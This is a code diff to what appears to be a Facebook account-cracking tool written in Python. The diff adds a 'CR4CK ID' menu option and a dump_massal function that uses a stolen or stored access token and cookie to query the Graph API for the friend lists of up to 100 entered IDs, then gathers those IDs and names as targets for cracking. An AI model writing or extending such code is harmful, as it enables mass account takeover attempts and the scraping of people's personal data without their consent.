@@ -666,6 +666,7 @@ def menu():
   ##  print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
   ##  print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
     print(f"""\x1b[1;32m[1] CR4CK FILE🔥[WORK]         """)
+    print(f"""\x1b[1;32m[2] CR4CK ID🔥[GOOD]         """)
    ## print(f"""\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mCHECK OK IDz   """)
     print("""\x1b[1;32m[0] DARCHUN⬅️""")
     #print('------------------------------------------------')
@@ -676,7 +677,7 @@ def menu():
     elif HAMA in ['1']:
         crack_file()
     elif HAMA in ['2','02']:
-        public()
+        dump_massal()
     elif HAMA in ['0']:
         os.system('rm -rf .token.txt')
         os.system('rm -rf .cookie.txt')
@@ -699,6 +700,70 @@ def crack_file():
     for xid in lin:
         id.append(xid)
     setting()
+
+
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input(' How Many id : '))
+	except ValueError:
+		print('ERROR ')
+		exit()
+	if jum<1 or jum>100:
+		print(' Dump ID ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(' ID'+str(yz)+' : ')
+		uid.append(kl)
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+		print('')
+		print(f' Total IDs : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('</> Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'<•>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
  
 #-------------[ PENGATURAN-IDZ ]---------------#
  
